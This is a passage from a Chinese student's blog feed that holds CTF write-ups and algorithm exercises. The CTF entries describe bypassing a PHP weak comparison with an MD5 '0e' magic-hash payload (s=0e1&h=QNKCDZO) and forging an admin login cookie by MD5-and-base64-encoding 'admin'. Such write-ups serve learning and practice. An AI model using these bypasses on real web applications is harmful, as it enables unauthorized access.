class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">实例</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义变量并设置为空值</span></span><br><span class="line">$nameErr = $emailErr = $genderErr = $websiteErr = <span class="string">""</span>;</span><br><span class="line">$name = $email = $gender = $comment = $website = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">"name"</span>])) &#123;</span><br><span class="line">    $nameErr = <span class="string">"Name is required"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $name = test_input($_POST[<span class="string">"name"</span>]);</span><br><span class="line">    <span class="comment">// 检查名字是否包含字母和空格</span></span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z ]*$/"</span>,$name)) &#123;</span><br><span class="line">      $nameErr = <span class="string">"Only letters and white space allowed"</span>; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">"email"</span>])) &#123;</span><br><span class="line">    $emailErr = <span class="string">"Email is required"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $email = test_input($_POST[<span class="string">"email"</span>]);</span><br><span class="line">    <span class="comment">// 检查电邮地址语法是否有效</span></span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">"/([\w\-]+\@[\w\-]+\.[\w\-]+)/"</span>,$email)) &#123;</span><br><span class="line">      $emailErr = <span class="string">"Invalid email format"</span>; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">"website"</span>])) &#123;</span><br><span class="line">    $website = <span class="string">""</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $website = test_input($_POST[<span class="string">"website"</span>]);</span><br><span class="line">    <span class="comment">// 检查 URL 地址语言是否有效（此正则表达式同样允许 URL 中的下划线）</span></span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">"/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%</span></span><br><span class="line"><span class="string">    =~_|]/i"</span>,$website)) &#123;</span><br><span class="line">      $websiteErr = <span class="string">"Invalid URL"</span>; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">"comment"</span>])) &#123;</span><br><span class="line">    $comment = <span class="string">""</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $comment = test_input($_POST[<span class="string">"comment"</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">"gender"</span>])) &#123;</span><br><span class="line">    $genderErr = <span class="string">"Gender is required"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $gender = test_input($_POST[<span class="string">"gender"</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></script></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;文章内容主要来自W3School，仅作为学习记录使用。&lt;/p&gt;
&lt;h2 id=&quot;在-PHP-创建用户定义函数&quot;&gt;&lt;a href=&quot;#在-PHP-创建用户定义函数&quot; class=&quot;headerlink&quot; title=&quot;在 PHP 创建用户定义函数&quot;&gt;&lt;/a&gt;在 PHP 创建用
      
    
    </summary>
    
      <category term="notes" scheme="https://singlemindedt.github.io/categories/notes/"/>
    
    
      <category term="PHP" scheme="https://singlemindedt.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CumtCTF2019华为杯</title>
    <link href="https://singlemindedt.github.io/2019/09/30/CumtCTF2019%E5%8D%8E%E4%B8%BA%E6%9D%AF/"/>
    <id>https://singlemindedt.github.io/2019/09/30/CumtCTF2019华为杯/</id>
    <published>2019-09-30T07:38:23.000Z</published>
    <updated>2019-10-04T16:49:46.497Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p>点开链接为seed和hash参数的提交框，尝试admin，admin，返回Fail…;查看响应，发现有payload，提示访问<code>index.php?source=1</code><br>发现php代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_secured_random</span><span class="params">()</span> </span>&#123; <span class="comment">// cause random is the way</span></span><br><span class="line">    $a = rand(<span class="number">1337</span>,<span class="number">2600</span>)*<span class="number">42</span>;</span><br><span class="line">    $b = rand(<span class="number">1879</span>,<span class="number">1955</span>)*<span class="number">42</span>;</span><br><span class="line"></span><br><span class="line">    $a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">secured_hash_function</span><span class="params">($plain)</span> </span>&#123; <span class="comment">// cause md5 is the best hash ever</span></span><br><span class="line">    $secured_plain = sanitize_user_input($plain);</span><br><span class="line">    <span class="keyword">return</span> md5($secured_plain);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize_user_input</span><span class="params">($input)</span> </span>&#123; <span class="comment">// cause someone told me to never trust user input</span></span><br><span class="line">    $re = <span class="string">'/[^a-zA-Z0-9]/'</span>;<span class="comment">//re不为a-zA-Z0-9</span></span><br><span class="line">    $secured_input = preg_replace($re, <span class="string">""</span>, $input);</span><br><span class="line">    <span class="comment">//preg_replace函数（搜索input中符合re正则的内容用“ ”代替，即去除不是a-zA-Z0-9）</span></span><br><span class="line">    <span class="keyword">return</span> $secured_input;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment">      // cause someone told me to never trust user input</span></span><br><span class="line"><span class="comment">    $input='&lt;&lt;&lt;&gt;&gt;&gt;.AZ.,,assddf23232????'; </span></span><br><span class="line"><span class="comment">    $re = '/[^a-zA-Z0-9]/';//re不为a-zA-Z0-9</span></span><br><span class="line"><span class="comment">    $secured_input = preg_replace($re, "", $input);</span></span><br><span class="line"><span class="comment">    //preg_replace函数（搜索input中符合re正则的内容用“ ”代替，即去除非a-zA-Z0-9）</span></span><br><span class="line"><span class="comment">     echo $secured_input;</span></span><br><span class="line"><span class="comment">     ?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     run:AZassddf23232</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"secret.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'s'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'h'</span>]))</span><br><span class="line"> &#123;<span class="comment">//输入s,h</span></span><br><span class="line">    <span class="comment">//isset在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false。</span></span><br><span class="line">    <span class="comment">//isset只能用于变量，因为传递任何其它参数都将造成解析错误</span></span><br><span class="line">    $s = sanitize_user_input($_POST[<span class="string">'s'</span>]);<span class="comment">//s=输入s</span></span><br><span class="line">    $h = secured_hash_function($_POST[<span class="string">'h'</span>]);<span class="comment">//h=MD5（h）</span></span><br><span class="line">    $r = gen_secured_random();<span class="comment">//r=随机数</span></span><br><span class="line">    <span class="keyword">if</span>($s != <span class="keyword">false</span> &amp;&amp; $h != <span class="keyword">false</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($s.$r == $h) <span class="comment">//弱类型比较</span></span><br><span class="line">        &#123;<span class="comment">//连接s和r，即：用户输入s+随机数==用户输入h   </span></span><br><span class="line">        <span class="comment">//*****此处利用0e漏洞，即0e+r==(填写hash为0开头字符)</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Well done! Here is your flag: "</span>.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Fail..."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&lt;p&gt;Hum ...&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=0e1<span class="variable">&amp;h</span>=QNKCDZO<span class="variable">&amp;submit</span>=<span class="meta">Check</span></span><br></pre></td></tr></table></figure><h2 id="Misc两岁半的猪"><a href="#Misc两岁半的猪" class="headerlink" title="Misc两岁半的猪"></a>Misc两岁半的猪</h2><p>打开压缩包为三只猪png，利用stegsolve发下有二维码；</p><hr><h2 id="寻找你的Key"><a href="#寻找你的Key" class="headerlink" title="寻找你的Key"></a>寻找你的Key</h2><p>得到压缩包，解压发现需要密码，用binwalk文件分离，得到另外一个压缩包0.zip和kEy.exe<br><img src="/images/key1.png" alt="key1"><br><img src="/images/key2.png" alt="key2"><br>将kEy.exe放进winhex,得到逆序图片base64编码<br><img src="/images/key3.png" alt="key3"><br>逆序编码，转图片，得到二维码<br><img src="/images/key4.png" alt="key4"></p><h2 id="委屈的兔兔"><a href="#委屈的兔兔" class="headerlink" title="委屈的兔兔"></a>委屈的兔兔</h2><p>将图片拖入winhex，得到Unicode 编码，直接百度解码得到 flag</p><h2 id="302？还有其他？"><a href="#302？还有其他？" class="headerlink" title="302？还有其他？"></a>302？还有其他？</h2><p>看到302，抓包，发现存在1ndex.php,访问1ndex.php发现RAW中有key和base64编码后的png图片，转图片，没有什么发现，<br>直接站长工具解密带隐藏信息的图片，输入密码，得到flag；<br>（此处做一补充，当时利用binwalk -e分离文件得到一个空文本文件和一个zlib文件，利用脚本解密zlib文件应该也能成功，不过当时未跑出来）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Web签到题&quot;&gt;&lt;a href=&quot;#Web签到题&quot; class=&quot;headerlink&quot; title=&quot;Web签到题&quot;&gt;&lt;/a&gt;Web签到题&lt;/h2&gt;&lt;p&gt;点开链接为seed和hash参数的提交框，尝试admin，admin，返回Fail…;查看响应，发现有pay
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://singlemindedt.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>暴跳老板+Flag在哪？</title>
    <link href="https://singlemindedt.github.io/2019/09/25/%E6%9A%B4%E8%B7%B3%E8%80%81%E6%9D%BF/"/>
    <id>https://singlemindedt.github.io/2019/09/25/暴跳老板/</id>
    <published>2019-09-25T14:49:02.000Z</published>
    <updated>2019-09-27T15:38:49.163Z</updated>
    
    <content type="html"><![CDATA[<h2 id="暴跳老板"><a href="#暴跳老板" class="headerlink" title="暴跳老板"></a>暴跳老板</h2><p>随便输入内容，得到弹窗要以POST方式用Dear发邮件，抓包：<br><img src="/image/%E6%9A%B4%E8%B7%B31.png" alt="暴跳"><br>直接在postText后添加Dear=MyBoss，发包得到flag</p><hr><h2 id="Flag在哪？"><a href="#Flag在哪？" class="headerlink" title="Flag在哪？"></a>Flag在哪？</h2><p>burpsuit抓包，发现有五个跳转页面，但是都没有flag:)<br>/where_is_flag.php<br>/flag.php<br><strong>/I_have_a_frog.php</strong><br><strong>/I_have_a_flag.php</strong><br>/no_flag.php<br>看看大佬们骚操作，要组合一下 orz ，flagfrog.php,发包得到flag。</p><hr><h2 id="美味的饼干"><a href="#美味的饼干" class="headerlink" title="美味的饼干"></a>美味的饼干</h2><p>点击链接得到一个登录页面，尝试admin，111<br>提示“登录成功，欢迎admin！”，但是并没有什么有用的信息。查看源代码，提示“只有admin才有flag”。<br>检查请求头，有可疑Cookie：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">login</span>=ZWUxMWNiYjE5MDUyZTQwYjA3YWFjMGNhMDYwYzIzZWU%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>base64解码：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ee<span class="number">11</span>cbb<span class="number">19052e40</span>b<span class="number">07</span>aac<span class="number">0</span>ca<span class="number">060</span><span class="keyword">c</span><span class="number">23</span>ee</span><br></pre></td></tr></table></figure><p>MD5解码：<br>user</p><p>那么意思基本就清楚了，应该是要Cookie信息为admin，才能够得到flag</p><p>admin<br>MD5：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">21232f</span>297a57a5a743894a0e4a801fc3</span><br></pre></td></tr></table></figure><p>base64:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MjEyMzJmMjk<span class="number">3</span>YTU<span class="number">3</span>YTVh<span class="symbol">NzQzODk0</span>YTBl<span class="symbol">NGE4</span>MDFmYzM=</span><br></pre></td></tr></table></figure><p>更改Cookie，重发，在响应里看到flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;暴跳老板&quot;&gt;&lt;a href=&quot;#暴跳老板&quot; class=&quot;headerlink&quot; title=&quot;暴跳老板&quot;&gt;&lt;/a&gt;暴跳老板&lt;/h2&gt;&lt;p&gt;随便输入内容，得到弹窗要以POST方式用Dear发邮件，抓包：&lt;br&gt;&lt;img src=&quot;/image/%E6%9A%B4%
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>最大子段和</title>
    <link href="https://singlemindedt.github.io/2019/09/24/%E6%9C%80%E5%A4%A7%E5%AD%90%E6%AE%B5%E5%92%8C/"/>
    <id>https://singlemindedt.github.io/2019/09/24/最大子段和/</id>
    <published>2019-09-24T14:18:31.000Z</published>
    <updated>2019-09-24T14:22:04.803Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题D：最大子段和"><a href="#问题D：最大子段和" class="headerlink" title="问题D：最大子段和"></a>问题D：最大子段和</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定n 个整体组成的序列a1，a2，… an，求子段和a i + a i + 1 + … + a j（子段可为空集）的替代。</p><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>包含多组测试数据。第一行为一个整数T（1 &lt;= T &lt;= 20），代表测试数据个数。</p><p>每组测试数据第一行为一个整数n ，代表有n 个整数（1 &lt;= n &lt;= 10000）。</p><p>接下来一行有n 个数x（-1000 &lt;= x &lt;= 1000）。</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>输出其对应的最大子段和。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="symbol">2 </span>-<span class="number">11</span> <span class="number">4</span> <span class="number">13</span> -<span class="number">1</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">18</span></span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>子段可为空集，答案为0</p><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxsum</span><span class="params">(<span class="keyword">int</span> b[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> tempsum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> Maxsum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">tempsum=(tempsum+b[i])&gt;b[i]?(tempsum+b[i]):b[i];</span><br><span class="line"><span class="keyword">if</span>(tempsum&gt;Maxsum)</span><br><span class="line">Maxsum=tempsum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> Maxsum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> T;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;T&gt;&gt;n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line"><span class="keyword">int</span> SUM=maxsum(a,n);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;SUM&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;问题D：最大子段和&quot;&gt;&lt;a href=&quot;#问题D：最大子段和&quot; class=&quot;headerlink&quot; title=&quot;问题D：最大子段和&quot;&gt;&lt;/a&gt;问题D：最大子段和&lt;/h1&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="算法" scheme="https://singlemindedt.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://singlemindedt.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="动态规划" scheme="https://singlemindedt.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>汽水瓶</title>
    <link href="https://singlemindedt.github.io/2019/09/24/%E6%B1%BD%E6%B0%B4%E7%93%B6/"/>
    <id>https://singlemindedt.github.io/2019/09/24/汽水瓶/</id>
    <published>2019-09-24T09:41:42.000Z</published>
    <updated>2019-09-24T14:16:32.134Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题-E-汽水瓶【25】"><a href="#问题-E-汽水瓶【25】" class="headerlink" title="问题 E: 汽水瓶【25】"></a>问题 E: 汽水瓶【25】</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？</p><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n(1≤n≤100)，表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出 0</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">81</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">40</span></span><br></pre></td></tr></table></figure><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><p>```C++</p><p>#include<iostream><br>using namespace std;<br>int main()<br>{<br>    int n=0;<br>    while(cin&gt;&gt;n)<br>    {<br>        int m=0;//最多可喝<br>        if(n==0)<br>        {<br>        continue;<br>        }<br>        if(n==2)//第一次忘了这个初次n=2的情况<br>        {<br>        cout&lt;&lt;1&lt;&lt;endl;<br>        continue;//此处若无会多输出 0<br>        }<br>        else<br>        while(n&gt;2)<br>        {<br>            int bn=n;<br>            n=n/3+n%3;<br>            m+=bn/3;<br>            if(n==2)<br>            {<br>            m++;<br>            break;<br>            }<br>        }<br>        cout&lt;&lt;m&lt;&lt;endl;</iostream></p><pre><code>}return 0;</code></pre><p>}<br>/*由规律可得如下方法： </p><p>#include<iostream><br>using namespace std;<br>int main()<br>{<br>int num = 0;<br>    while (cin&gt;&gt;num)<br>        if (num == 0)<br>            continue;<br>        else<br>            cout&lt;&lt;num/2&lt;&lt;endl;//都是整除结果<br>    return 0;<br>}<br>*/ </iostream></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;问题-E-汽水瓶【25】&quot;&gt;&lt;a href=&quot;#问题-E-汽水瓶【25】&quot; class=&quot;headerlink&quot; title=&quot;问题 E: 汽水瓶【25】&quot;&gt;&lt;/a&gt;问题 E: 汽水瓶【25】&lt;/h1&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; c
      
    
    </summary>
    
      <category term="算法" scheme="https://singlemindedt.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://singlemindedt.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>最长公共子序列</title>
    <link href="https://singlemindedt.github.io/2019/09/24/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%AD%90%E5%BA%8F%E5%88%97/"/>
    <id>https://singlemindedt.github.io/2019/09/24/最长公共子序列/</id>
    <published>2019-09-24T08:02:54.000Z</published>
    <updated>2019-09-24T08:07:31.137Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题-A-最长公共子序列"><a href="#问题-A-最长公共子序列" class="headerlink" title="问题 A: 最长公共子序列"></a>问题 A: 最长公共子序列</h1><p>时间限制: 1 Sec  内存限制: 32 MB</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>对于每组输入，输出两个字符串的最长公共子序列的长度。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">abcfbc</span> <span class="string">abfcab</span></span><br><span class="line"><span class="attr">programming</span> <span class="string">contest </span></span><br><span class="line"><span class="attr">abcd</span> <span class="string">mnp</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> 